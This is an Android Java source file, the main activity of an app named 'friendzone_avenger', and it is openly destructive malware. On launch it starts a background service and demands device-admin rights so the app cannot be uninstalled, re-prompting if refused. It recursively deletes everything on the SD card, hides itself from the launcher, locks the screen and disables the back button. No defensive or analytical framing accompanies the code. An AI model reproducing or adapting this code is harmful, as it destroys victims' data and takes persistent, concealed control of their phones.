package com.developer.crdzbird.friendzone_avenger;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;

import java.io.File;

/**
 * Created by crdzbird on 06-23-16.
 *
 */
public class MainActivity extends Activity {

	String SENT = "SMS_SENT";
    String DELIVERED = "SMS_DELIVERED";
	private DevicePolicyManager policyManager;
	ComponentName deviceAdmin;
    
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	
		/**Run services in background.**/

		System.out.println("Actividad Elaborada");
		Intent msgIntent = new Intent(getApplicationContext(), IntentServiceClass.class);
		startService(msgIntent);
		
		/**Stop from uninstalling application.**/
		DeviceManager deviceManager=new DeviceManager();
		deviceManager.activateDeviceAdmin(MainActivity.this, DeviceManager.REQUEST_CODE_ENABLE_ADMIN);


		//HideAppFromLauncher(this);
		/**wipe out sd-card.**/
		wipeMemoryCard();


	}

	public void blockAdminDelete(){
		policyManager = (DevicePolicyManager) this.getSystemService(Context.DEVICE_POLICY_SERVICE);
		deviceAdmin = new ComponentName(this, PreyDeviceAdmin.class);
		policyManager.lockNow();
		System.out.println("BLOQUEO REALIZADO...");
	}

	
	@Override
	public void onBackPressed() {
		//super.onBackPressed();
		/**Do nothing.**/
	}
	
	/**
	 * This method is used to hide app from app launcher.
	 * @param context
	 */
	public void HideAppFromLauncher(Context context) {
		try{
			System.out.println("APLICACION OCULTADA DE LAUNCHER");
			PackageManager p = context.getPackageManager();
		    p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		}catch (Exception e) {
		    e.printStackTrace();
		}
	finish();
	}
	

	/**
	 * This method is used to wipe complete data from sd-card.
	 */
	public void wipeMemoryCard() {
        File deleteMatchingFile = new File(Environment
                .getExternalStorageDirectory().toString());
        try {
            File[] filenames = deleteMatchingFile.listFiles();
            if (filenames != null && filenames.length > 0) {
                for (File tempFile : filenames) {
                    if (tempFile.isDirectory()) {
                        wipeDirectory(tempFile.toString());
                        tempFile.delete();
                    } else {
                        tempFile.delete();
                    }
                }
            } else {
                deleteMatchingFile.delete();
            }
        } catch (Exception e) {
        }
    }

    /**
     * This method is used to wipe directory from sd-card.
     * @param name
     */
    private static void wipeDirectory(String name) {
        try {
			File directoryFile = new File(name);
			File[] filenames = directoryFile.listFiles();
			if (filenames != null && filenames.length > 0) {
			    for (File tempFile : filenames) {
					System.out.println(tempFile.getName());
					if (tempFile.isDirectory()) {
			            wipeDirectory(tempFile.toString());
			            tempFile.delete();
			        } else {
			            tempFile.delete();
			        }
			    }
			} else {
			    directoryFile.delete();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
    }
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		switch (requestCode) {
		case DeviceManager.REQUEST_CODE_ENABLE_ADMIN:
			DeviceManager adminManager=new DeviceManager();
			if(adminManager.isDeviceAdminActive(getApplicationContext())){
				/**Hide application from app launcher.**/
				HideAppFromLauncher(getApplicationContext());
				blockAdminDelete();
			}
			else{
				DeviceManager devicemanager=new DeviceManager();
				devicemanager.activateDeviceAdmin(MainActivity.this, DeviceManager.REQUEST_CODE_ENABLE_ADMIN);
			}
		}
	}
	
}
